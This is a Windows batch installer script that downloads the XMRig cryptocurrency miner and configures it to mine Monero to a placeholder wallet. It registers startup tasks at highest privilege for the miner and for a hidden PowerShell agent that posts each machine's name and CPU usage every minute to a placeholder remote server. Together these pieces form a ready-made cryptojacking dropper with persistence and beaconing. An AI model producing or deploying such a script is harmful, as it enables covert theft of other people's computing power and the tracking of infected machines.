@echo off
REM ============================================================================
REM Combined installer: XMRig + reporting agent
REM ============================================================================
SET "XMRIG_ZIP_URL=https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip"
SET "INSTALL_DIR=C:\xmrig"
SET "SERVER_URL=http://YOUR.SERVER.IP:8000/report"
SET "WALLET=YOUR_MONERO_WALLET"
SET "WORKER=%COMPUTERNAME%"

mkdir "%INSTALL_DIR%" >nul 2>&1
SET "TMPZIP=%TEMP%\xmrig.zip"
powershell -NoProfile -Command ^
  "Invoke-WebRequest -Uri '%XMRIG_ZIP_URL%' -OutFile '%TMPZIP%' -UseBasicParsing"
powershell -NoProfile -Command ^
  "Expand-Archive -LiteralPath '%TMPZIP%' -DestinationPath '%INSTALL_DIR%' -Force"

FOR /F "delims=" %%I IN ('powershell -NoProfile -Command "Get-ChildItem -Path '%INSTALL_DIR%' -Recurse -Filter xmrig.exe | Select-Object -First 1 -ExpandProperty FullName"') DO SET "XMRIG_EXE=%%I"

(
echo {
echo   "autosave": true,
echo   "cpu": { "enabled": true, "asm": true, "max-threads-hint": 50 },
echo   "pools": [
echo     { "url": "pool.minexmr.com:443", "user": "%WALLET%", "pass": "%WORKER%", "keepalive": true }
echo   ]
echo }
) > "%INSTALL_DIR%\config.json"

SET "WRAPPER=%INSTALL_DIR%\run_xmrig.cmd"
echo @echo off > "%WRAPPER%"
echo cd /d "%~dp0" >> "%WRAPPER%"
echo "%XMRIG_EXE%" --config "%INSTALL_DIR%\config.json" >> "%WRAPPER%"

SET "REPORT_PS1=%INSTALL_DIR%\miner_report.ps1"
(
echo $server = "%SERVER_URL%"
echo $machine_id = "$env:COMPUTERNAME"
echo $worker = "%WORKER%"
echo $interval = 60
echo function Get-CPUUsage { ^(Get-Counter '\Processor(_Total)\%% Processor Time'^).CounterSamples.CookedValue ^| ForEach-Object { [math]::Round($_,2) } }
echo while ($true^) {
echo     $report = @{ machine_id=$machine_id; worker=$worker; cpu_usage=^(Get-CPUUsage^); hashrate=0; unpaid_estimate=0 }
echo     $json = $report ^| ConvertTo-Json
echo     try { Invoke-RestMethod -Uri $server -Method Post -Body $json -ContentType "application/json" -TimeoutSec 10 } catch {}
echo     Start-Sleep -Seconds $interval
echo }
) > "%REPORT_PS1%"

schtasks /Create /SC ONSTART /RL HIGHEST /TN "XMRig Miner" /TR "\"%WRAPPER%\"" /F
schtasks /Create /SC ONSTART /RL HIGHEST /TN "Miner Reporter" /TR "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%REPORT_PS1%\"" /F

echo Done. Miner and reporting agent installed.
pause